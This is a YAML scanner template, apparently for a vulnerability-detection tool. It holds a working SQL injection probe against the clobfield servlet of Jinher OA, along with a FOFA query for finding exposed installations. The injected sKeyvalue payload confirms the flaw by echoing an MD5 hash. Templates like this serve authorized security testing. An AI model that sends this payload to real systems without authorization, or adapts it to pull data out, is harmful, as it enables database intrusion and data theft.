id: jinher-jc6-clobfield-sqli

info:
  name: 金和 OA clobfield SQL 注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    fofa: title="金和协同管理平台" || app="金和网络-金和OA" || body="src=\"/c6/WebResource.axd"
  reference:
    - https://mp.weixin.qq.com/s/WGHmYrJ1G6aE-CxDUZzPCg
  tags: jinher,oa,sqli
  created: 2024/02/29

set:
  randInt: randomInt(1000000000, 9999999999)
rules:
  r0:
    request:
      method: POST
      path: /jc6/servlet/clobfield
      body: key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11' and CONVERT(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{randInt}}%27))))=1 and ''='
    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(randInt))))
expression: r0()
